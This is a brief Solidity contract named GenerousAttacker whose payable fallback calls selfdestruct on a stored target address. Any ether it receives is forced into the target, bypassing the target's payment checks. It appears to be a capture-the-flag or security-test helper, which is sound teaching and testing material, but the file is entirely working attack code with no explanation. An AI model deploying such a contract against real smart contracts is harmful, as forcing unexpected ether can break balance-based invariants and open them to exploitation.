pragma solidity 0.4.21;


contract GenerousAttacker {
    address public target;

    function GenerousAttacker(address _target) public {
        target = _target;
    }

    function() public payable {
        selfdestruct(target);
    }
}
